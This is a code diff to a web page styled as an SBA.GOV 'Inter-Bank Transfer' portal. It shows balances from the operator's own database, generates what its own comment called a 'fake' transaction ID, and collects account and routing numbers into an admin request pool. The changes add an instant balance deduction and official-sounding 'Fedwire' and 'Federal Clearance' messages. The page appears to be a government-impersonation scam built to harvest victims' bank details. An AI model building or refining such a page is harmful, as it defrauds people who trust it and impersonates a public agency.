@@ -6,7 +6,7 @@
     <title>SBA Portal | Inter-Bank Transfer</title>
     <style>
         :root { --sba-blue: #00274c; --sba-accent: #0071bc; }
-        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; }
         
         .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
         .nav-header { background: var(--sba-blue); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; }
@@ -31,10 +31,13 @@
             cursor: pointer;
             text-transform: uppercase;
             letter-spacing: 1px;
+            transition: 0.3s;
         }
         .transfer-btn:disabled { background: #94a3b8; cursor: not-allowed; }
 
         .secure-footer { text-align: center; font-size: 9px; color: #94a3b8; margin-top: 20px; font-family: monospace; }
+        
+        .back-btn { background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer; }
     </style>
 </head>
 <body>
@@ -46,7 +49,7 @@
 
     <div class="nav-header">
         <h1 style="color:white; margin:0; font-size:16px; letter-spacing:2px; font-weight: 900;">SBA.GOV</h1>
-        <button onclick="location.href='dashboard.html'" style="background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); color:white; padding:5px 12px; border-radius:4px; font-size:10px; font-weight:bold; cursor:pointer;">BACK</button>
+        <button onclick="location.href='dashboard.html'" class="back-btn">BACK</button>
     </div>
 
     <div class="container">
@@ -115,7 +118,6 @@
         let userRawBalance = 0;
         let userData = {};
 
-        // Generate a fake session TX ID
         document.getElementById('txId').innerText = "SBA-TR-" + Math.random().toString(36).substr(2, 7).toUpperCase();
 
         onAuthStateChanged(auth, async (user) => {
@@ -124,8 +126,10 @@
             const userSnap = await getDoc(doc(db, "users", user.uid));
             if (userSnap.exists()) {
                 userData = userSnap.data();
-                const bal = userData.balance || 0;
-                userRawBalance = typeof bal === 'string' ? parseFloat(bal.replace(/,/g, '')) : parseFloat(bal);
+                
+                // Professional Balance Sanitization
+                let bal = userData.balance || 0;
+                userRawBalance = typeof bal === 'string' ? parseFloat(bal.replace(/[$,]/g, '')) : parseFloat(bal);
                 
                 document.getElementById('availBal').innerText = "$" + userRawBalance.toLocaleString('en-US', {
                     minimumFractionDigits: 2,
@@ -152,29 +156,34 @@
             btn.innerText = "FEDWIRE AUTHORIZING...";
 
             try {
-                // Submit to admin pool
+                // PROFESSIONAL AUTO-DEDUCT: Calculate new balance
+                const newBalance = userRawBalance - amt;
+
+                // A. SUBTRACT MONEY IMMEDIATELY
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    balance: newBalance,
+                    status: "TRANSFER PENDING REVIEW"
+                });
+
+                // B. CREATE THE ADMIN REQUEST
                 await addDoc(collection(db, "requests"), {
                     userId: auth.currentUser.uid,
                     userName: userData.fullName || "User",
                     userEmail: auth.currentUser.email,
-                    type: "TRANSFER",
+                    type: "WIRE TRANSFER",
                     amount: amt,
                     method: document.getElementById('tMethod').value,
-                    bankDetails: `${bank} | Name: ${holder} | Acc: ${acc} | Rout: ${rout}`,
+                    bankDetails: `BANK: ${bank} | HOLDER: ${holder} | ACC: ${acc} | ROUT: ${rout}`,
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // Update status on dashboard
-                await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                    status: "TRANSFER PENDING REVIEW"
-                });
-
-                alert("TRANSFER AUTHORIZED\n\nYour request has been queued for federal disbursement. Please check your transaction ledger for status updates.");
+                alert(`TRANSFER AUTHORIZED\n\n$${amt.toLocaleString()} has been deducted. Your funds are now in the Federal Clearance queue.`);
                 window.location.href = 'dashboard.html';
                 
             } catch(e) { 
-                alert("GATEWAY ERROR: Request timed out."); 
+                console.error(e);
+                alert("GATEWAY ERROR: Transaction could not be encrypted."); 
                 btn.disabled = false;
                 btn.innerText = "Confirm & Authorize Transfer";
             }
